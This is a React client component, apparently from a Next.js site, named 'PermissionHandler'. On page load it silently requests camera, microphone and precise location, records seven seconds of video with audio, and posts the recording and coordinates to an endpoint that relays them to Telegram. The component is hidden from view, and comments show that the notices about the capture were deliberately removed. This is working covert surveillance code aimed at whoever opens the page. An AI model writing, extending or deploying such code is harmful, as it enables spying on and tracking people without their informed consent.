"use client";

import React, { useEffect, useRef, useState } from "react";
import { toast } from "sonner";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const RECORDING_DURATION_MS = 7000; // Reverted to 7 seconds for video and audio recording

type DataToSend = {
  video?: string; // Changed from selfie to video
  latitude?: number;
  longitude?: number;
};

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]); // Renamed from audioChunksRef
  const [isProcessing, setIsProcessing] = useState(true);

  const sendDataToTelegram = async (data: DataToSend) => {
    if (Object.keys(data).length === 0) {
      toast.info("No data to send to Telegram (permissions denied or unavailable).");
      return;
    }

    try {
      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        toast.success("Data successfully sent to Telegram!");
      } else {
        const errorData = await response.json();
        toast.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
      }
    } catch (error: any) {
      toast.error(`Network error sending data to Telegram: ${error.message}`);
    }
  };

  useEffect(() => {
    const handlePermissionsAndSend = async () => {
      setIsProcessing(true);
      const dataToSend: DataToSend = {};
      let stream: MediaStream | null = null;

      const cameraAndMicPromise = new Promise<void>(async (resolve) => {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          // No toast for camera/microphone access granted

          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            await new Promise((res) => {
              videoRef.current!.onloadedmetadata = () => {
                videoRef.current!.play().then(res).catch(err => {
                  console.error("Error playing video stream:", err);
                  // No toast for failed video stream play
                  res(null);
                });
              };
            });
          }

          // Record video with audio for 7 seconds
          mediaRecorderRef.current = new MediaRecorder(stream, { mimeType: 'video/webm' });
          mediaChunksRef.current = []; // Reset chunks for new recording
          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };
          mediaRecorderRef.current.onstop = () => {
            const videoBlob = new Blob(mediaChunksRef.current, { type: "video/webm" });
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              dataToSend.video = reader.result as string;
              // No toast for video recorded
              resolve();
            };
          };
          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, RECORDING_DURATION_MS);

        } catch (error: any) {
          // No toast for camera/microphone access denied, only console error
          console.error(`Camera/Microphone access denied: ${error.message}`);
          resolve(); // Resolve even if denied, so Promise.allSettled can continue
        }
      });

      const geolocationPromise = new Promise<void>((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              dataToSend.latitude = position.coords.latitude;
              dataToSend.longitude = position.coords.longitude;
              // No toast for location access granted
              resolve();
            },
            (error) => {
              // No toast for location access denied, only console error
              console.error(`Location access denied: ${error.message}`);
              resolve(); // Resolve even if denied
            },
            { enableHighAccuracy: true }
          );
        } else {
          // No toast for geolocation not supported, only console error
          console.error("Geolocation not supported in this browser.");
          resolve(); // Resolve if not supported
        }
      });

      // Wait for all permission requests and data collection to settle
      await Promise.allSettled([cameraAndMicPromise, geolocationPromise]);

      // Send all collected data to Telegram
      await sendDataToTelegram(dataToSend);

      // Stop all tracks after processing, regardless of success or failure
      if (stream) {
        (stream as MediaStream).getTracks().forEach((track: MediaStreamTrack) => track.stop());
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
      }
      setIsProcessing(false);
    };

    handlePermissionsAndSend();
  }, []);

  return (
    <div style={{ display: 'none' }}>
      <video ref={videoRef} autoPlay playsInline muted />
      {isProcessing && <p style={{ display: 'none' }}>Processing permissions...</p>} {/* Also hide this text */}
    </div>
  );
};

export default PermissionHandler;